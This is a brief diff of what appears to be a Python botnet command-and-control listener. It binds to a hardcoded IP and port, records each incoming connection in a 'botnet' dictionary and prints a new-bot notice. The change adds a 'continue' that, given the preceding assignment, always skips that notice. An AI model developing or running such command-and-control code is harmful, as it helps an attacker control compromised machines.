@@ -27,8 +27,9 @@ def start_server(port=2003,ip="142.93.197.240"):
             bot,addr = s.accept()
             botnet[str(addr[0])] = bot
             if(botnet.get(str(addr[0]))):
-                print("[*] New bot %s"%(str(addr[0])))
-                print(">>")
+                continue
+            print("[*] New bot %s"%(str(addr[0])))
+            print(">>")
         except socket.error:
             pass
 
